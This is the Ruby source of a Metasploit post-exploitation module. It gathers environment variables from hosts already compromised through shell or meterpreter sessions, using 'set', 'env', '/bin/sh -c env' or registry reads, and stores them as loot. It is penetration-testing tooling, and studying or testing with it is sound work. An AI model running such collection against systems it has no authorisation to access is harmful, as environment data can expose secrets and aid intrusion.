##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Multi Gather Generic Operating System Environment Settings',
			'Description'   => %q{ This module prints out the operating system environment variables },
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'egypt' ],
			'Platform'      => [ 'linux', 'win' ],
			'SessionTypes'  => [ 'shell', 'meterpreter' ]
		))
		@ltype = 'generic.environment'
	end

	def run
		case session.type
		when "shell"
			get_env_shell
		when "meterpreter"
			get_env_meterpreter
		end
		store_loot(@ltype, "text/plain", session, @output) if @output
		print_line @output if @output
	end

	def get_env_shell
		print_line @output if @output
		if session.platform =~ /win/
			@ltype = "windows.environment"
			cmd = "set"
		else
			@ltype = "unix.environment"
			cmd = "env"
		end
		@output = session.shell_command_token(cmd)
	end

	def get_env_meterpreter
		case sysinfo["OS"]
		when /windows/i
			var_names = []
			var_names << registry_enumvals("HKEY_CURRENT_USER\\Volatile Environment")
			var_names << registry_enumvals("HKEY_CURRENT_USER\\Environment")
			var_names << registry_enumvals("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment")
			output = []
			var_names.delete(nil)
			var_names.flatten.uniq.sort.each do |v|
				# Emulate the output of set and env, e.g. VAR=VALUE
				output << "#{v}=#{session.fs.file.expand_path("\%#{v}\%")}"
			end
			@output = output.join("\n")
			@ltype = "windows.environment"
		else
			# Don't know what it is, hope it's unix
			print_status sysinfo["OS"]
			chan = session.sys.process.execute("/bin/sh", "-c env", {"Channelized" => true})
			@output = chan.read
			@ltype = "unix.environment"
		end
	end

end
